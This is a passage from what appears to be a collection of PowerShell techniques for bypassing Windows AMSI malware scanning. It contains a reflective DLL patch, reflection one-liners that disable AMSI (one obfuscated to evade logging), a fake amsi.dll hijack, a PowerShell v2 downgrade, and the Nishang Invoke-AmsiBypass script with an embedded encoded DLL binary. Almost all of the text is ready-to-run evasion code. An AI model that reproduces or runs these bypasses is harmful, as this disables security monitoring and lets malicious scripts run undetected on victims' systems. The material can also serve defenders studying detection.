0, 108, 0, 108, 0, 0, 0, 0, 0, 40, 0, 2, 0, 1, 0, 76, 0, 101, 0, 103, 0, 97, 0, 108, 0, 67, 0, 111, 0, 112, 0, 121, 0, 114, 0, 105, 0, 103, 0, 104, 0, 116, 0, 0, 0, 32, 0, 0, 0, 70, 0, 15, 0, 1, 0, 79, 0, 114, 0, 105, 0, 103, 0, 105, 0, 110, 0, 97, 0, 108, 0, 70, 0, 105, 0, 108, 0, 101, 0, 110, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 0, 0, 0, 54, 0, 11, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 6, 0, 1, 0, 80, 0, 114, 0, 111, 0, 100, 0, 117, 0, 99, 0, 116, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 56, 0, 8, 0, 1, 0, 65, 0, 115, 0, 115, 0, 101, 0, 109, 0, 98, 0, 108, 0, 121, 0, 32, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 12, 0, 0, 0, 96, 60, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | 
    Out-Null;
    Write-Output "DLL has been reflected";
  }
  [Bypass.AMSI]::Patch();
}
MyPatch;
Start-Sleep 1;
```
# Using Matt Graebers Reflection method #
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
# Using Matt Graebers Reflection method with WMF5 autologging bypass #
```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

# Using Matt Graebers second Reflection method #
```
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
```

# Using Cornelis de Plaas DLL hijack method #
```
[Byte[]] $temp = $DllBytes -split ' '                
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
```
# Using PowerShell version 2 #
```
if ($ShowOnly -eq $True)
{
        Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
}
else
{
        Write-Verbose "Checking if .Net version 2.0.50727 is installed."
        $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
	if($versions -match "2.0.50727")
	{
        	Write-Verbose ".Net version 2.0.50727 found."
        	Write-Output "Executing the bypass."
        	powershell.exe -version 2
	}
	else
	{
        	Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
	}
}
```

# Nishang all in one #
```
function Invoke-AmsiBypass
{
<#
.SYNOPSIS
Nishang script which uses publicly known methods to bypass/avoid AMSI.

.DESCRIPTION
This script implements publicly known methods bypass or avoid AMSI on Windows machines.

AMSI is a script malware detection mechanism enabled by default in Windows 10. 
(https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)

This script implements 6 methods of bypassing AMSI.
unload - Method by Matt Graeber. Unloads AMSI from current PowerShell session.
unload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session.
unloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.
unloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. 
dllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) 
psv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI.

The script also provides information on tools which can be used for obfuscation:
ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/)
Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)

.PARAMETER Method
The method to be used for elevation. Defaut one is unloadsilent.

.PARAMETER ShowOnly
The bypass is not executed. Just shown to the user. 

.EXAMPLE
PS > Invoke-AmsiBypass -Verbose
Above command runs the unloadsilent method.

.EXAMPLE
PS > Invoke-PsUACme -Method unloadobfuscated -Verbose
Above command runs the unloadobfuscated method.

.LINK
http://www.labofapenetrationtester.com/2016/09/amsi.html
https://github.com/samratashok/nishang
#>
    
    
    [CmdletBinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [ValidateSet("unload","unloadsilent","unloadobfuscated","unload2","dllhijack","psv2","obfuscation")]
        [String]
        $Method = "unloadsilent",
       
        [Parameter(Position = 1, Mandatory = $False)]
        [Switch]
        $ShowOnly
    )

    $AmsiX86 = "77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 